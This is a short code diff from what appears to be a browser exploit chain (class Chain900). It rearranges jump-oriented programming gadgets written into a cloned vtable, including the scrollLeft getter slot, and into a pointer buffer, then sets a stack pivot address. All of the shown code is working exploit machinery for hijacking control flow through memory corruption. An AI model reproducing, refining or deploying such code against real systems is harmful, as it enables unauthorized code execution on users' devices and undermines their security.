@@ -522,18 +522,23 @@ class Chain900 extends Chain900Base {
 
         // 0x1b8 is the offset of the scrollLeft getter native function
         rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
-
+        rw.write64(vtable_clone, 0xb8, this.get_gadget(jop2));
+        rw.write64(vtable_clone, 0x1c, this.get_gadget(jop3));
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
         //rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        //rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
+        //rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
+        //rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
+        //rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
+        //rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
         rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
-        rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop3));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop5));
         // value to pivot rsp to
         rw.write64(rax_ptrs, 0x18, this.stack_addr);
 
